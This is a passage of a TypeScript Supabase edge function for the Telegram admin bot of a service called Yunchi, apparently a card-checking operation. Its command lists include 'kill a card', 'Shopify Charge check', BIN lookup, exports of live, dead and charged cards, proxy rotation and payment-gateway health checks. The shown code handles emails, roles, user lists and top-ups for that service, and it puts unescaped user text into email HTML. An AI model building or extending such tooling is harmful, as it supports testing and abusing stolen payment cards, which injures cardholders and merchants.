import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { sendEmail } from "../_shared/email-helper.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
const RESEND_API_KEY = Deno.env.get("RESEND_API_KEY");
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

// Use environment variable with fallback for admin chat ID
const ADMIN_CHAT_ID = ADMIN_TELEGRAM_CHAT_ID || "8496943061";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

interface TelegramUpdate {
  message?: {
    message_id: number;
    chat: { id: number };
    text?: string;
    caption?: string;
    reply_to_message?: {
      text?: string;
      document?: {
        file_id: string;
        file_name?: string;
        mime_type?: string;
        file_size?: number;
      };
    };
    document?: {
      file_id: string;
      file_name?: string;
      mime_type?: string;
      file_size?: number;
    };
  };
  callback_query?: {
    id: string;
    data: string;
    message?: {
      chat: { id: number };
      message_id: number;
    };
  };
}

// ═══════════════════════════════════════════════════════════
// EMAIL HELPERS
// ═══════════════════════════════════════════════════════════

async function sendUnbanEmail(email: string, username: string | null): Promise<void> {
  if (!RESEND_API_KEY) return;

  const senders = [
    "Yunchi Support <noreply@yunchicheck.com>",
    "Yunchi Support <onboarding@resend.dev>"
  ];

  for (const sender of senders) {
    try {
      console.log(`Sending unban email to ${email} from ${sender}`);
      
      const response = await fetch("https://api.resend.com/emails", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${RESEND_API_KEY}`,
        },
        body: JSON.stringify({
          from: sender,
          reply_to: "support@yunchicheck.com",
          to: [email],
          subject: "✅ Your Account Has Been Unbanned - Yunchi",
          html: `
            <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #0a0a0a;">
              <div style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); padding: 30px; text-align: center; border-radius: 16px 16px 0 0;">
                <h1 style="color: white; margin: 0; font-size: 24px;">✅ Account Restored</h1>
              </div>
              <div style="background: #0f0f0f; padding: 30px; border-radius: 0 0 16px 16px; color: #e5e5e5; border: 1px solid #1a1a1a; border-top: none;">
                <p style="color: #e5e5e5; font-size: 16px; line-height: 1.6;">Hello${username ? ` <strong style="color: #22c55e;">${username}</strong>` : ''},</p>
                
                <p style="color: #a3a3a3; font-size: 16px; line-height: 1.6;">Great news! Your account ban has been lifted and your access has been fully restored.</p>
                
                <div style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); border-radius: 12px; padding: 24px; margin: 25px 0; text-align: center;">
                  <p style="color: white; font-size: 18px; margin: 0; font-weight: bold;">🎉 You can now log in and use the platform again!</p>
                </div>
                
                <div style="background: #1a1a1a; border-radius: 12px; padding: 20px; margin: 20px 0;">
                  <p style="color: #a3a3a3; font-size: 14px; margin: 0; line-height: 1.6;">
                    Please ensure you follow our terms of service to maintain your account in good standing.
                  </p>
                </div>
                
                <div style="text-align: center; margin-top: 25px;">
                  <a href="https://yunchicheck.com/dashboard" style="display: inline-block; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-weight: bold;">Go to Dashboard</a>
                </div>
                
                <hr style="border: none; border-top: 1px solid #262626; margin: 30px 0;">
                
                <p style="color: #525252; font-size: 12px; text-align: center;">
                  Welcome back!<br>
                  — Yunchi Team
                </p>
              </div>
            </div>
          `,
          headers: {
            "X-Entity-Ref-ID": crypto.randomUUID(),
            "X-Priority": "1",
            "Importance": "high",
          },
        }),
      });

      if (!response.ok) {
        const responseText = await response.text();
        console.error(`Failed to send unban email from ${sender}: ${response.status} - ${responseText}`);
        
        // If domain not verified, try fallback sender
        if (response.status === 403 && sender.includes("yunchicheck.com")) {
          console.log(`Domain not verified, trying fallback sender...`);
          continue;
        }
        continue;
      }
      
      console.log(`Unban email sent to ${email} from ${sender}`);
      return; // Success, exit function
    } catch (error) {
      console.error(`Error sending unban email from ${sender}:`, error);
      continue; // Try next sender
    }
  }
  
  console.error(`Failed to send unban email to ${email} with all senders`);
}

async function sendBroadcastEmail(email: string, username: string | null, broadcastMessage: string, linkUrl?: string | null): Promise<boolean> {
  const linkButtonHtml = linkUrl ? `
          <div style="text-align: center; margin: 25px 0;">
            <a href="${linkUrl}" style="display: inline-block; background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); color: #ffffff; text-decoration: none; padding: 14px 32px; border-radius: 10px; font-weight: 600; font-size: 15px;">🔗 Open Link</a>
          </div>` : "";

  const result = await sendEmail({
    to: email,
    subject: "📢 Announcement from Yunchi",
    text: `Hello${username ? ` ${username}` : ''},\n\n${broadcastMessage}${linkUrl ? `\n\nLink: ${linkUrl}` : ''}\n\n— Yunchi Team\n\nIf you no longer wish to receive these announcements, you can update your notification preferences in your account settings.`,
    html: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #0a0a0a;">
        <div style="background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); border-radius: 16px 16px 0 0; padding: 40px 30px; text-align: center;">
          <div style="background: rgba(0,0,0,0.3); width: 60px; height: 60px; border-radius: 12px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
            <span style="font-size: 28px;">📢</span>
          </div>
          <h1 style="color: #ffffff; margin: 0 0 10px; font-size: 24px; font-weight: 700;">Announcement</h1>
          <p style="color: rgba(255,255,255,0.8); margin: 0; font-size: 14px;">Important update from Yunchi</p>
        </div>
        
        <div style="background: #0f0f0f; border-radius: 0 0 16px 16px; padding: 30px; border: 1px solid #1a1a1a; border-top: none;">
          <p style="color: #e5e5e5; font-size: 16px; line-height: 1.6; margin: 0 0 20px;">Hello${username ? ` <strong style="color: #ef4444;">${username}</strong>` : ''},</p>
          
          <div style="background: #1a0a0a; border-left: 4px solid #dc2626; border-radius: 8px; padding: 20px; margin: 20px 0;">
            <p style="color: #e5e5e5; font-size: 16px; line-height: 1.7; margin: 0; white-space: pre-wrap;">${broadcastMessage}</p>
          </div>
          ${linkButtonHtml}
          <div style="text-align: center; margin-top: 30px;">
            <a href="https://yunchicheck.com/dashboard" style="display: inline-block; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: #ffffff; text-decoration: none; padding: 14px 32px; border-radius: 10px; font-weight: 600; font-size: 15px;">Visit Dashboard</a>
          </div>
          
          <hr style="border: none; border-top: 1px solid #262626; margin: 30px 0;">
          
          <p style="color: #525252; font-size: 12px; margin: 0 0 10px 0; text-align: center;">
            You're receiving this because you have an account at Yunchi.
          </p>
          <p style="color: #404040; font-size: 11px; margin: 0; text-align: center;">
            To manage your notification preferences, visit your <a href="https://yunchicheck.com/dashboard" style="color: #ef4444; text-decoration: none;">account settings</a>.
          </p>
        </div>
      </div>
    `,
    tags: [
      { name: "category", value: "announcement" },
      { name: "type", value: "broadcast" },
    ],
    highPriority: false,
  });

  if (result.success) {
    console.log(`Broadcast email sent successfully to ${email}`);
    return true;
  } else {
    console.error(`Failed to send broadcast email to ${email}: ${result.error}`);
    return false;
  }
}

// ═══════════════════════════════════════════════════════════
// UTILITY HELPERS
// ═══════════════════════════════════════════════════════════

// Fetch all records with pagination to bypass Supabase's 1000 row default limit
async function fetchAllRecords(
  supabase: any,
  table: string,
  selectFields: string,
  filters?: { column: string; operator: string; value: any }[],
  orderBy?: { column: string; ascending: boolean }
): Promise<any[]> {
  const PAGE_SIZE = 10000;
  let allRecords: any[] = [];
  let from = 0;
  let hasMore = true;

  while (hasMore) {
    let query = supabase
      .from(table)
      .select(selectFields)
      .range(from, from + PAGE_SIZE - 1);

    // Apply filters
    if (filters) {
      for (const filter of filters) {
        if (filter.operator === "eq") {
          query = query.eq(filter.column, filter.value);
        } else if (filter.operator === "ilike") {
          query = query.ilike(filter.column, filter.value);
        } else if (filter.operator === "like") {
          query = query.like(filter.column, filter.value);
        }
      }
    }

    // Apply ordering
    if (orderBy) {
      query = query.order(orderBy.column, { ascending: orderBy.ascending });
    }

    const { data, error } = await query;

    if (error) {
      console.error(`Error fetching from ${table}:`, error);
      break;
    }

    if (data && data.length > 0) {
      allRecords = allRecords.concat(data);
      from += PAGE_SIZE;
      hasMore = data.length === PAGE_SIZE;
    } else {
      hasMore = false;
    }
  }

  return allRecords;
}

// Escape HTML special characters for Telegram HTML parse mode
function escapeHtml(text: string | null | undefined): string {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function formatTimeAgo(date: Date): string {
  const now = new Date();
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  const diffDays = Math.floor(diffMs / 86400000);

  if (diffMins < 1) return "Just now";
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  if (diffDays < 7) return `${diffDays}d ago`;
  
  return date.toLocaleDateString("en-US", { month: "short", day: "numeric" });
}

// ═══════════════════════════════════════════════════════════
// TELEGRAM API HELPERS
// ═══════════════════════════════════════════════════════════

async function sendTelegramMessage(
  chatId: string | number,
  message: string,
  replyMarkup?: object,
  replyToMessageId?: number
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) return false;

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    };
    if (replyMarkup) body.reply_markup = replyMarkup;
    if (replyToMessageId) body.reply_to_message_id = replyToMessageId;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      console.error("Telegram API error:", await response.json());
      return false;
    }
    return true;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return false;
  }
}

// Send message and return the message ID for editing
async function sendTelegramMessageWithId(
  chatId: string | number,
  message: string,
  replyMarkup?: object,
  replyToMessageId?: number
): Promise<number | null> {
  if (!TELEGRAM_BOT_TOKEN) return null;

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    };
    if (replyMarkup) body.reply_markup = replyMarkup;
    if (replyToMessageId) body.reply_to_message_id = replyToMessageId;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      console.error("Telegram API error:", await response.json());
      return null;
    }
    
    const data = await response.json();
    return data.result?.message_id || null;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return null;
  }
}

async function editTelegramMessage(
  chatId: string | number,
  messageId: number,
  message: string,
  replyMarkup?: object
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) return false;

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      message_id: messageId,
      text: message,
      parse_mode: "HTML",
    };
    if (replyMarkup) body.reply_markup = replyMarkup;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      console.error("Telegram edit error:", await response.json());
      return false;
    }
    return true;
  } catch (error) {
    console.error("Error editing message:", error);
    return false;
  }
}

async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) return;

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text,
          show_alert: true,
        }),
      }
    );
  } catch (error) {
    console.error("Error answering callback:", error);
  }
}

// Edit message caption (for photos) - removes or updates buttons
async function editMessageCaption(
  chatId: string | number,
  messageId: number,
  caption: string,
  replyMarkup?: object | null
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) return false;

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      message_id: messageId,
      caption: caption,
      parse_mode: "HTML",
    };
    
    // If replyMarkup is explicitly null, remove keyboard; if undefined, don't include it
    if (replyMarkup === null) {
      body.reply_markup = { inline_keyboard: [] };
    } else if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageCaption`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      console.error("Telegram editMessageCaption error:", await response.json());
      return false;
    }
    return true;
  } catch (error) {
    console.error("Error editing caption:", error);
    return false;
  }
}

async function editMessageReplyMarkup(
  chatId: number,
  messageId: number,
  ticketUuid: string,
  currentStatus: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) return;

  const statusButtons = [
    { text: currentStatus === "open" ? "✓ Live" : "Live", callback_data: `open_${ticketUuid}` },
    { text: currentStatus === "processing" ? "✓ Processing" : "Processing", callback_data: `processing_${ticketUuid}` },
  ];
  const statusButtons2 = [
    { text: currentStatus === "solved" ? "✓ Solved" : "Solved", callback_data: `solved_${ticketUuid}` },
    { text: currentStatus === "closed" ? "✓ Closed" : "Closed", callback_data: `closed_${ticketUuid}` },
  ];

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [statusButtons, statusButtons2] },
        }),
      }
    );
  } catch (error) {
    console.error("Error editing markup:", error);
  }
}

// Send document (file) via Telegram
async function sendTelegramDocument(
  chatId: string | number,
  fileContent: string,
  filename: string,
  caption?: string
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) return false;

  try {
    const formData = new FormData();
    formData.append("chat_id", chatId.toString());
    
    // Create a blob from the file content
    const blob = new Blob([fileContent], { type: "text/plain" });
    formData.append("document", blob, filename);
    
    if (caption) {
      formData.append("caption", caption);
      formData.append("parse_mode", "HTML");
    }

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      {
        method: "POST",
        body: formData,
      }
    );

    if (!response.ok) {
      console.error("Telegram sendDocument error:", await response.json());
      return false;
    }
    return true;
  } catch (error) {
    console.error("Error sending Telegram document:", error);
    return false;
  }
}

// ═══════════════════════════════════════════════════════════
// BOT COMMANDS REGISTRATION
// ═══════════════════════════════════════════════════════════

async function setBotCommands(supabase?: any): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) return;

  const publicCommands = [
    { command: "start", description: "Start bot & get Chat ID" },
    { command: "menu", description: "Full navigation menu" },
    { command: "help", description: "View help & features" },
    { command: "mystatus", description: "Check account status" },
    { command: "kill", description: "Kill a card (5 credits)" },
    { command: "sh", description: "Shopify Charge check" },
    { command: "bin", description: "Lookup BIN details" },
  ];

  const adminCommands = [
    { command: "start", description: "Start bot" },
    { command: "menu", description: "Full navigation" },
    { command: "help", description: "View help" },
    { command: "mystatus", description: "Check status" },
    { command: "admincmd", description: "Admin panel" },
    { command: "ticket", description: "Manage ticket" },
    { command: "topups", description: "Pending topups" },
    { command: "topup", description: "User's pending topup" },
    { command: "rejectall", description: "Reject all pending topups" },
    { command: "addfund", description: "Add/deduct credits" },
    { command: "banuser", description: "Ban user" },
    { command: "unbanuser", description: "Unban user" },
    { command: "cancelban", description: "Cancel ban" },
    { command: "deleteuser", description: "Delete user" },
    { command: "deletealluser", description: "Delete all users" },
    { command: "viewbans", description: "View banned users" },
    { command: "broadcast", description: "Broadcast message" },
    { command: "stats", description: "View statistics" },
    { command: "allusers", description: "List all users" },
    { command: "userinfo", description: "User details" },
    { command: "grantadmin", description: "Grant admin access" },
    { command: "revokeadmin", description: "Revoke admin access" },
    { command: "promote", description: "Promote to moderator" },
    { command: "demote", description: "Demote moderator" },
    { command: "admins", description: "List admins & mods" },
    { command: "allcards", description: "Export all checked cards" },
    { command: "livecards", description: "Export live cards only" },
    { command: "deadcards", description: "Export dead cards only" },
    { command: "chargedcards", description: "Export charged cards" },
    { command: "cardstats", description: "Real-time card statistics" },
    { command: "bincard", description: "Export cards by BIN" },
    { command: "viewblocked", description: "View blocked devices/IPs" },
    { command: "unblockdevice", description: "Unblock device/IP" },
    { command: "blockdevice", description: "Block device/IP manually" },
    { command: "userdevices", description: "View user's devices" },
    { command: "healthsites", description: "Health check gateway sites" },
    { command: "addurl", description: "Add URLs for health check" },
    { command: "clearurls", description: "Clear all gateway URLs" },
    { command: "urlcount", description: "View total URLs count" },
    { command: "addproxy", description: "Add proxy ip:port:user:pass" },
    { command: "proxies", description: "View saved proxies" },
    { command: "delproxy", description: "Delete a proxy" },
    { command: "gate", description: "Set gateway availability" },
    { command: "addgate", description: "Add new gateway" },
    { command: "editgate", description: "Edit gateway config" },
    { command: "delgate", description: "Delete a gateway" },
  ];

  const moderatorCommands = [
    { command: "start", description: "Start bot" },
    { command: "menu", description: "Full navigation" },
    { command: "help", description: "View help" },
    { command: "mystatus", description: "Check status" },
    { command: "admincmd", description: "Moderator panel" },
    { command: "ticket", description: "View & reply to tickets" },
    { command: "addfund", description: "Add credits to user" },
    { command: "stats", description: "View statistics" },
    { command: "allusers", description: "List all users" },
    { command: "userinfo", description: "View user details" },
    { command: "viewbans", description: "View banned users" },
  ];

  try {
    // Set public commands (default)
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setMyCommands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ commands: publicCommands }),
    });

    // Set admin commands for super admin
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setMyCommands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        commands: adminCommands,
        scope: { type: "chat", chat_id: parseInt(ADMIN_CHAT_ID) },
      }),
    });

    // Set moderator and admin commands per-user (only if supabase client provided)
    if (supabase) {
      // Set moderator commands for all granted moderators
      const { data: modProfiles } = await supabase
        .from("user_roles")
        .select("user_id")
        .eq("role", "moderator");

      if (modProfiles) {
        for (const mod of modProfiles) {
          const { data: profile } = await supabase
            .from("profiles")
            .select("telegram_chat_id")
            .eq("user_id", mod.user_id)
            .maybeSingle();

          if (profile?.telegram_chat_id) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setMyCommands`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                commands: moderatorCommands,
                scope: { type: "chat", chat_id: parseInt(profile.telegram_chat_id) },
              }),
            });
          }
        }
      }

      // Also set admin commands for all granted admins (not just super admin)
      const { data: adminProfiles } = await supabase
        .from("user_roles")
        .select("user_id")
        .eq("role", "admin");

      if (adminProfiles) {
        for (const admin of adminProfiles) {
          const { data: profile } = await supabase
            .from("profiles")
            .select("telegram_chat_id")
            .eq("user_id", admin.user_id)
            .maybeSingle();

          if (profile?.telegram_chat_id && profile.telegram_chat_id !== ADMIN_CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setMyCommands`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                commands: adminCommands,
                scope: { type: "chat", chat_id: parseInt(profile.telegram_chat_id) },
              }),
            });
          }
        }
      }
    }
  } catch (error) {
    console.error("Error setting commands:", error);
  }
}

// Super admin check (hardcoded)
function isSuperAdmin(chatId: string): boolean {
  return chatId === ADMIN_CHAT_ID;
}

// Check if user is admin (super admin OR has admin role via telegram_chat_id)
async function isAdminAsync(chatId: string, supabase: any): Promise<boolean> {
  if (chatId === ADMIN_CHAT_ID) return true;

  const { data: profile, error: profileError } = await supabase
    .from("profiles")
    .select("user_id")
    .eq("telegram_chat_id", chatId)
    .maybeSingle();

  if (profileError || !profile) {
    if (profileError) console.error("[isAdminAsync] Profile error:", profileError);
    return false;
  }

  const { data: roles, error: roleError } = await supabase
    .from("user_roles")
    .select("role")
    .eq("user_id", profile.user_id)
    .eq("role", "admin");

  if (roleError) {
    console.error("[isAdminAsync] Role error:", roleError);
    return false;
  }

  return roles && roles.length > 0;
}

// Check if user is moderator (has moderator role via telegram_chat_id)
async function isModeratorAsync(chatId: string, supabase: any): Promise<boolean> {
  const { data: profile, error: profileError } = await supabase
    .from("profiles")
    .select("user_id")
    .eq("telegram_chat_id", chatId)
    .maybeSingle();

  if (profileError || !profile) {
    if (profileError) console.error("[isModeratorAsync] Profile error:", profileError);
    return false;
  }

  const { data: roles, error: roleError } = await supabase
    .from("user_roles")
    .select("role")
    .eq("user_id", profile.user_id)
    .eq("role", "moderator");

  if (roleError) {
    console.error("[isModeratorAsync] Role error:", roleError);
    return false;
  }

  return roles && roles.length > 0;
}

// Check if user is staff (admin OR moderator)
async function isStaffAsync(chatId: string, supabase: any): Promise<boolean> {
  // Super admin always has access
  if (chatId === ADMIN_CHAT_ID) return true;

  const { data: profile, error: profileError } = await supabase
    .from("profiles")
    .select("user_id")
    .eq("telegram_chat_id", chatId)
    .maybeSingle();

  if (profileError) {
    console.error("[isStaffAsync] Profile lookup error:", profileError);
    return false;
  }
  if (!profile) {
    console.log("[isStaffAsync] No profile found for chat_id:", chatId);
    return false;
  }

  // Use .select() with limit instead of maybeSingle to avoid errors when user has multiple roles
  const { data: roles, error: roleError } = await supabase
    .from("user_roles")
    .select("role")
    .eq("user_id", profile.user_id)
    .in("role", ["admin", "moderator"]);

  if (roleError) {
    console.error("[isStaffAsync] Role lookup error:", roleError);
    return false;
  }

  const hasAccess = roles && roles.length > 0;
  console.log(`[isStaffAsync] chat_id=${chatId}, user_id=${profile.user_id}, roles=${JSON.stringify(roles)}, hasAccess=${hasAccess}`);
  return hasAccess;
}

// Legacy sync function for backward compatibility
function isAdmin(chatId: string): boolean {
  return chatId === ADMIN_CHAT_ID;
}

// ═══════════════════════════════════════════════════════════
// EMAIL NOTIFICATION
// ═══════════════════════════════════════════════════════════

async function sendEmailNotification(
  userEmail: string,
  ticketId: string,
  subject: string,
  message: string,
  adminName: string
): Promise<void> {
  if (!RESEND_API_KEY) return;

  try {
    await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${RESEND_API_KEY}`,
      },
      body: JSON.stringify({
        from: "Support Team <onboarding@resend.dev>",
        to: [userEmail],
        subject: `[${ticketId}] New Reply`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #7c3aed;">New Reply to Your Ticket</h2>
            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <p><strong>Ticket:</strong> ${ticketId}</p>
              <p><strong>Subject:</strong> ${subject}</p>
            </div>
            <div style="background: #ffffff; padding: 20px; border: 1px solid #e9ecef; border-radius: 8px;">
              <p style="color: #6c757d;"><strong>${adminName}:</strong></p>
              <p style="white-space: pre-wrap;">${message}</p>
            </div>
          </div>
        `,
      }),
    });
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

async function sendUserTelegramNotification(
  chatId: string,
  ticketId: string,
  subject: string,
  message: string,
  adminName: string
): Promise<void> {
  await sendTelegramMessage(chatId, `
📩 <b>New Reply</b>

<b>Ticket:</b> ${ticketId}
<b>Subject:</b> ${subject}

<b>${adminName}:</b>
${message}
`);
}

// ═══════════════════════════════════════════════════════════
// USER LIST BUILDER
// ═══════════════════════════════════════════════════════════

function buildUsersListMessage(
  users: any[],
  page: number,
  totalCount: number,
  connectedCount: number,
  bannedCount: number,
  perPage: number
): { message: string; keyboard: object | null } {
  const totalPages = Math.ceil(totalCount / perPage);
  const startIndex = page * perPage;
  const endIndex = Math.min(startIndex + perPage, totalCount);
  const displayUsers = users.slice(startIndex, endIndex);

  let userList = "";
  displayUsers.forEach((user, index) => {
    const status = user.is_banned ? "🚫" : "✅";
    const username = user.username || "No username";
    const email = user.email || "No email";
    const credits = user.credits ?? 0;
    
    userList += `
${startIndex + index + 1}. ${status} <b>${username}</b>
   📧 ${email}
   💰 ${credits} credits
`;
  });

  const message = `
👥 <b>All Users</b> (${page + 1}/${totalPages})

📊 Total: ${totalCount} | Connected: ${connectedCount} | Banned: ${bannedCount}
${userList}
<i>Use /userinfo [email] for details</i>
`;

  let keyboard: object | null = null;
  if (totalPages > 1) {
    const buttons = [];
    if (page > 0) buttons.push({ text: "◀️ Prev", callback_data: `allusers_page_${page - 1}` });
    buttons.push({ text: `${page + 1}/${totalPages}`, callback_data: "allusers_noop" });
    if (page < totalPages - 1) buttons.push({ text: "Next ▶️", callback_data: `allusers_page_${page + 1}` });
    keyboard = { inline_keyboard: [buttons] };
  }

  return { message, keyboard };
}

// ═══════════════════════════════════════════════════════════
// TOPUPS LIST BUILDER
// ═══════════════════════════════════════════════════════════

function buildTopupsListMessage(
  topups: any[],
  page: number,
  totalCount: number,
  perPage: number
): { message: string; keyboard: object | null } {
  const totalPages = Math.ceil(totalCount / perPage);
  const startIndex = page * perPage;
  const displayTopups = topups.slice(startIndex, startIndex + perPage);

  // Calculate total pending credits
  const totalPendingCredits = topups.reduce((sum, t) => sum + Number(t.amount), 0);

  let topupList = "";
  displayTopups.forEach((topup, index) => {
    const date = new Date(topup.created_at).toLocaleDateString("en-US", { month: "short", day: "numeric" });
    const time = new Date(topup.created_at).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });
    const username = topup.username || "Unknown";
    // Amount field stores credits directly
    const credits = Number(topup.amount);
    const paymentMethod = (topup.payment_method || "unknown").toUpperCase();
    
    topupList += `
<b>${startIndex + index + 1}.</b> 💰 <b>${credits.toLocaleString()} credits</b>
   👤 ${username}
   💳 ${paymentMethod} | 📅 ${date} ${time}
   🆔 <code>${topup.id.slice(0, 8)}</code>
`;
  });

  const message = totalCount === 0 
    ? `
💰 <b>Pending Topups</b>

✅ <b>All clear!</b> No pending requests.

<i>New topup requests will appear here.</i>
`
    : `
💰 <b>Pending Topups</b> (${page + 1}/${totalPages || 1})

📊 <b>Summary:</b>
├ Pending: <b>${totalCount}</b> requests
└ Total: <b>${totalPendingCredits.toLocaleString()}</b> credits
${topupList}
<i>Tap a button to approve or reject</i>
`;

  const buttons: any[][] = [];
  
  // Add approve/reject buttons for each topup
  displayTopups.forEach((topup) => {
    const credits = Number(topup.amount);
    const username = topup.username?.slice(0, 8) || "User";
    buttons.push([
      { text: `✅ ${credits} (${username})`, callback_data: `topup_accept_${topup.id}` },
      { text: `❌ Reject`, callback_data: `topup_reject_${topup.id}` }
    ]);
  });

  // Pagination buttons
  if (totalPages > 1) {
    const navButtons = [];
    if (page > 0) navButtons.push({ text: "◀️ Prev", callback_data: `topups_page_${page - 1}` });
    navButtons.push({ text: `📄 ${page + 1}/${totalPages}`, callback_data: "topups_noop" });
    if (page < totalPages - 1) navButtons.push({ text: "Next ▶️", callback_data: `topups_page_${page + 1}` });
    buttons.push(navButtons);
  }
  
  // Action buttons row
  const actionButtons = [{ text: "🔄 Refresh", callback_data: "topups_refresh" }];
  if (totalCount > 0) {
    actionButtons.push({ text: `🗑️ Reject All (${totalCount})`, callback_data: "topups_reject_all" });
  }
  buttons.push(actionButtons);
  
  // Back to menu
  buttons.push([{ text: "🔙 Back to Menu", callback_data: "menu_back" }]);

  return { message, keyboard: { inline_keyboard: buttons } };
}

// ═══════════════════════════════════════════════════════════
// ADMIN COMMAND HANDLERS
// ═══════════════════════════════════════════════════════════

async function handleAdminCmd(chatId: string, supabase: any, messageId?: number): Promise<void> {
  const isAdminUser = await isAdminAsync(chatId, supabase);
  const isModUser = await isModeratorAsync(chatId, supabase);
  
  if (!isAdminUser && !isModUser) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Access denied");
    } else {
      await sendTelegramMessage(chatId, "❌ Access denied");
    }
    return;
  }

  await setBotCommands(supabase);

  // Moderator menu (limited)
  if (isModUser && !isAdminUser) {
    const modMenu = `
🛡️ <b>Moderator Panel</b>

<b>📋 Support Tickets</b>
/ticket <code>[id]</code> - View &amp; reply to tickets

<b>💰 Credits</b>
/addfund <code>[email] [amount]</code> - Add credits to user

<b>📊 Data &amp; Monitoring</b>
/stats - View platform statistics
/allusers - Browse all users (paginated)
/userinfo <code>[user]</code> - View user details (read-only)
/viewbans - View banned users list

<b>✅ Your Permissions:</b>
• View &amp; reply to support tickets
• Add credits to users (no deductions)
• View platform stats &amp; user data
• View banned users
• View user info (no action buttons)

<b>❌ Restricted (Admin Only):</b>
• Ban/Unban, Delete users, Deduct credits
• Topup management, Broadcasts
• Gateway &amp; device management
• Card exports, Staff management

<i>Need elevated access? Contact an admin.</i>
`;
    const modKeyboard = { inline_keyboard: [
      [{ text: "💰 Add Fund", callback_data: "mod_addfund" }, { text: "📋 Tickets", callback_data: "mod_tickets" }],
      [{ text: "📊 Stats", callback_data: "mod_stats" }, { text: "👥 All Users", callback_data: "mod_allusers" }],
